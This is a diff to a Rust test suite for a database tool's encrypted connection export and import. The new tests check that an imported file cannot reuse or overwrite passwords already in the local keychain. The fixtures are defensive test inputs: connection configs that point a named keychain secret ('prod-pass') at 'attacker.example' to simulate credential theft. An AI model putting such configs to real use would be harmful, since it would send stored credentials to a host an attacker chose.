@@ -149,7 +149,8 @@ fn connections_move_with_their_passwords_back_in_the_keychain() {
     }
 
     let new = Computer::new("new");
-    let preview = preview_connections_import(&new.config(), &bytes, &secret(PASSWORD)).unwrap();
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
     let state = |id: &str| {
         preview
             .iter()
@@ -238,7 +239,8 @@ fn a_wrong_password_or_a_changed_file_writes_nothing() {
     for at in [bytes.len() / 2, bytes.len() - 1, 30] {
         let mut changed = bytes.clone();
         changed[at] ^= 0x80;
-        let result = preview_connections_import(&new.config(), &changed, &secret(PASSWORD));
+        let result =
+            preview_connections_import(&new.config(), &new.backend, &changed, &secret(PASSWORD));
         assert!(
             matches!(
                 result,
@@ -252,7 +254,7 @@ fn a_wrong_password_or_a_changed_file_writes_nothing() {
     let mut not_ours = bytes.clone();
     not_ours[0] = b'X';
     assert!(matches!(
-        preview_connections_import(&new.config(), &not_ours, &secret(PASSWORD)),
+        preview_connections_import(&new.config(), &new.backend, &not_ours, &secret(PASSWORD)),
         Err(TransferError::File(
             ConnectionsFileError::NotAConnectionsFile
         ))
@@ -294,6 +296,7 @@ fn only_personal_connections_are_exported() {
     let new = Computer::new("personal-only");
     let preview = preview_connections_import(
         &new.config(),
+        &new.backend,
         &std::fs::read(&file).unwrap(),
         &secret(PASSWORD),
     )
@@ -339,7 +342,8 @@ fn an_existing_connection_is_replaced_only_when_asked() {
     new.write("connections/orders.toml", mine);
     let account = connection_account(&new.config(), &personal("orders"));
     new.set_keychain(&account, "my-own-password");
-    let preview = preview_connections_import(&new.config(), &bytes, &secret(PASSWORD)).unwrap();
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
     assert_eq!(
         preview.iter().find(|i| i.id == "orders").unwrap().state,
         ItemState::Exists
@@ -423,7 +427,8 @@ fn a_profile_that_runs_a_program_keeps_its_connections_out() {
     );
     let bytes = export(&old, &[]);
     let new = Computer::new("program-profile-new");
-    let preview = preview_connections_import(&new.config(), &bytes, &secret(PASSWORD)).unwrap();
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
     assert!(
         preview
             .iter()
@@ -499,7 +504,8 @@ fn a_file_cannot_send_another_secret_or_the_environment_to_a_server_it_chooses()
     );
 
     let new = Computer::new("exfiltrate-new");
-    let preview = preview_connections_import(&new.config(), &bytes, &secret(PASSWORD)).unwrap();
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
     for id in ["steal", "dns", "vault", "hop", "through"] {
         let item = preview.iter().find(|item| item.id == id).unwrap();
         assert!(
@@ -539,5 +545,129 @@ fn a_file_cannot_send_another_secret_or_the_environment_to_a_server_it_chooses()
             .cloned()
             .collect::<Vec<_>>(),
         vec!["my-login".to_string()]
+    );
+}
+
+/// A connection that reads the keychain entry `prod-pass` by name and goes to a host the file
+/// chose.
+const NAMED_ELSEWHERE: &str = "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = { secret = \"keychain:prod-pass\" }\n";
+
+#[test]
+fn an_imported_connection_never_reads_a_password_this_computer_already_keeps() {
+    let _turn = crate::serial::file_turn(module_path!());
+    // The file names `prod-pass` but carries no value for it: the old computer had none.
+    let old = Computer::new("reuse-old");
+    old.write("connections/steal.toml", NAMED_ELSEWHERE);
+    let bytes = export(&old, &[]);
+
+    // This computer keeps a password under `prod-pass` for a connection of its own.
+    let new = Computer::new("reuse-new");
+    new.set_keychain("prod-pass", "the-real-production-password");
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
+    assert!(
+        matches!(&preview[0].state, ItemState::Refused(why) if why.contains("does not carry")),
+        "{preview:?}"
+    );
+    let results = import_connections(
+        &new.config(),
+        &new.backend,
+        &bytes,
+        &secret(PASSWORD),
+        &[],
+        &[],
+    )
+    .unwrap();
+    assert!(matches!(results[0].outcome, ItemOutcome::NotImported(_)));
+    assert!(!new.user().join("connections/steal.toml").exists());
+    assert_eq!(
+        new.keychain("prod-pass").as_deref(),
+        Some("the-real-production-password")
+    );
+
+    // Carrying a value does not replace another password kept here under that name.
+    let carrier = Computer::new("reuse-carrier");
+    carrier.write("connections/steal.toml", NAMED_ELSEWHERE);
+    carrier.set_keychain("prod-pass", "the-files-password");
+    let bytes = export(&carrier, &[]);
+    let preview =
+        preview_connections_import(&new.config(), &new.backend, &bytes, &secret(PASSWORD)).unwrap();
+    assert!(
+        matches!(&preview[0].state, ItemState::Refused(why) if why.contains("already holds")),
+        "{preview:?}"
+    );
+    import_connections(
+        &new.config(),
+        &new.backend,
+        &bytes,
+        &secret(PASSWORD),
+        &[],
+        &[],
+    )
+    .unwrap();
+    assert!(!new.user().join("connections/steal.toml").exists());
+    assert_eq!(
+        new.keychain("prod-pass").as_deref(),
+        Some("the-real-production-password")
+    );
+
+    // The same password under the same name is the user's own shared entry: imported.
+    let same = Computer::new("reuse-same");
+    same.set_keychain("prod-pass", "the-files-password");
+    let preview =
+        preview_connections_import(&same.config(), &same.backend, &bytes, &secret(PASSWORD))
+            .unwrap();
+    assert_eq!(preview[0].state, ItemState::New);
+    import_connections(
+        &same.config(),
+        &same.backend,
+        &bytes,
+        &secret(PASSWORD),
+        &[],
+        &[],
+    )
+    .unwrap();
+    assert!(same.user().join("connections/steal.toml").is_file());
+}
+
+#[test]
+fn a_replaced_connection_without_a_password_in_the_file_never_reads_the_old_one() {
+    let _turn = crate::serial::file_turn(module_path!());
+    // The file's `orders` goes to another host and carries no password.
+    let old = Computer::new("replace-blank-old");
+    old.write(
+        "connections/orders.toml",
+        "schema_version = 1\nengine = \"postgres\"\nhost = \"attacker.example\"\ndatabase = \"x\"\nuser = \"me\"\npassword = { secret = \"keychain\" }\n",
+    );
+    let bytes = export(&old, &[]);
+
+    let new = Computer::new("replace-blank-new");
+    new.write(
+        "connections/orders.toml",
+        ORDERS.replace("tunnel = \"bastion\"\n", "").as_str(),
+    );
+    let account = connection_account(&new.config(), &personal("orders"));
+    new.set_keychain(&account, "my-orders-password");
+    let results = import_connections(
+        &new.config(),
+        &new.backend,
+        &bytes,
+        &secret(PASSWORD),
+        &["orders".to_string()],
+        &[],
+    )
+    .unwrap();
+    assert_eq!(results[0].outcome, ItemOutcome::Replaced);
+    // The old password is gone, not handed to the new host: it is asked when connecting.
+    assert_eq!(new.keychain(&account), None);
+    let config = new.config();
+    let trust = TrustStore::load(&new.user()).unwrap();
+    let resolved = Resolver::new(&config, &trust, &new.backend)
+        .resolve(&personal("orders"))
+        .unwrap();
+    assert!(
+        matches!(resolved.password, Password::Prompt { .. }),
+        "{:?}",
+        resolved.password
     );
 }
